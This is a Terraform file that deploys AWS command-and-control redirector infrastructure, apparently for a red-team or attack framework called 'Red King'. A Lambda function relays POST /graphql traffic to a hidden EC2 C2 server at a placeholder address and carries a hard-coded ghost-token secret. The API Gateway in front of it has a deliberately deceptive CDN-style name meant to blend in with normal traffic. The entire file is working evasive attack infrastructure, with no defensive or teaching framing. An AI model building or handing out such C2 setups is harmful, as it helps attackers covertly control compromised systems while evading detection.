provider "aws" {
  region = "us-east-1"
}

# 📦 Variable: The implementation of the Red King Brain URL
variable "c2_brain_url" {
  type    = string
  default = "http://YOUR_HIDDEN_EC2_IP:9000/graphql"
}

# 👻 The Shadow Function (Lambda)
resource "aws_lambda_function" "shadow_redirector" {
  filename      = "function.zip"
  function_name = "red_king_shadow"
  role          = aws_iam_role.lambda_exec.arn
  handler       = "lambda_function.lambda_handler"
  runtime       = "python3.9"

  environment {
    variables = {
      C2_URL        = var.c2_brain_url
      SHARED_SECRET = "X-Ghost-Token: 7d9f8a"
    }
  }
}

# 🚪 The Front Door (API Gateway)
resource "aws_apigatewayv2_api" "c2_gateway" {
  name          = "cdn-content-delivery" # Deceptive Name
  protocol_type = "HTTP"
}

resource "aws_apigatewayv2_integration" "lambda_integration" {
  api_id           = aws_apigatewayv2_api.c2_gateway.id
  integration_type = "AWS_PROXY"
  integration_uri  = aws_lambda_function.shadow_redirector.invoke_arn
}

resource "aws_apigatewayv2_route" "default_route" {
  api_id    = aws_apigatewayv2_api.c2_gateway.id
  route_key = "POST /graphql"
  target    = "integrations/${aws_apigatewayv2_integration.lambda_integration.id}"
}

# 🎭 IAM Role (Permissions)
resource "aws_iam_role" "lambda_exec" {
  name = "serverless_lambda_role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = {
        Service = "lambda.amazonaws.com"
      }
    }]
  })
}

output "shadow_url" {
  value = aws_apigatewayv2_api.c2_gateway.api_endpoint
}
